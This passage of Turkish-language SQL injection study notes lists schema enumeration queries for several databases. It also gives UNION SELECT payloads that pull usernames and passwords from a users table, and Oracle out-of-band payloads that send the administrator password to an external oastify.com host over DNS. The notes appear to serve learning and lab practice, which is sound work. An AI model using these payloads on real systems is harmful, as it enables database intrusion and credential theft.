-- Mevcut veritabanındaki tüm şemalar
SELECT schema_name FROM information_schema.schemata;
```


#### POSTGRESQL NULL propagasyonu :

eğer birleştirmeye çalıştığın herhangi bir parça `NULL` ise, bütün sonuç `NULL` olur.

```sql
'a' || NULL || 'b'  →  NULL` 
```

Böyle durumlarda sorgunun devam etmesi ve çalışması için 
```sql
COALESCE(email, '') -- COALAESCE() eğer email değeri yok ise NULL yerine boş bir değer döner
-- Tam Örnek Sorgu 
UNION SELECT NULL, username || '~' || password || '~' || COALESCE(email, '') FROM users--
```


**MySQL :**

```MySql
-- Tüm veritabanı isimleri
SHOW DATABASES;
-- Mevcut veritabanındaki tüm şemalar
SELECT SCHEMA_NAME FROM information_schema.SCHEMATA;
```


**Microsoft SQL Server (MSSQL)** :

```sql
-- Sunucudaki tüm veritabanları
SELECT name FROM sys.databases;
-- Geçerli veritabanındaki tüm şemalar
SELECT name AS schema_name FROM sys.schemas;
```

**Oracle :**
 Temel Sorgular
```SQL
-- Bağlı olunan Oracle veritabanının adı
SELECT name FROM v$database;
--Oracle’da “schema” ile “user” kavramı neredeyse aynıdır. Yani her kullanıcı kendi şemasına (schema) sahiptir. Bu yüzden:
SELECT username FROM all_users;
```

Oracle da her bir `SELECT` sorgusu `FROM` kelimesi ile belirli bir tabloyla kullanılmak zorundadır. Oracle bu amaçta kullanılması için `dual` tablosunu oluşturmuş. Örnek : 
```sql
UNION SELECT NULL FROM DUAL--
```

**OAST TEKNİKLERİ :**
Veritabanı DNS ile etkileşim kurabiliyor mu diye öğrenmek için :
```sql
'|| UTL_INADDR.GET_HOST_ADDRESS('cdt2afnakmekb3yikb8mea9yup0go9cy.oastify.com') ||'
```
OUT of band sorgularını daha optimize edebilmek için.
 ```SQL
 '|| UTL_INADDR.GET_HOST_ADDRESS((SELECT password FROM users WHERE username='administrator') || '.cdt2afnakmekb3yikb8mea9yup0go9cy.oastify.com') ||'
```

# Önemli yerler : 
Çoğunlukla kullanılan Database sistemleri :
- MySQL
- MariaDB
- Oracle
- PostgreSQL
- MSSQL
- SQLite
NoSQL Database sistemleri:
- MongoDB
- Redis
- Cassandra
- Elasticsearch
- Firebase
- Amazon DynamoDB
